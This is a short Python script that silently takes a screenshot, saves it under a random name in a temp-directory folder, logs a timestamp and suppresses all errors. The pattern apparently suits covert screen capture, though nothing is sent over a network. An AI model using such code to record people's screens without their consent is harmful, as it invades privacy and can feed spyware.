import string
import random
import datetime
import tempfile
import os
from pyautogui import screenshot 
from time import sleep

def takeScreenshot():
    try:
       
        path_to_dir = tempfile.gettempdir() + "\\screenshots"
        path_to_logfile = path_to_dir + "\\screenshots.log"
        letters = string.ascii_lowercase
        name = ''.join(random.choice(letters) for i in range(10))
        
        if os.path.exists(path_to_dir) == False:
            os.mkdir(path_to_dir)
            sleep(2)
            
        myScreenshot = screenshot()
        myScreenshot.save(path_to_dir + "\\" + name + '.png')
        # should be saved to temp dir
        with open(path_to_logfile, "a") as file:
            file.write(str(datetime.datetime.now()) + "\n")

    except Exception as e:
        pass
    
takeScreenshot()
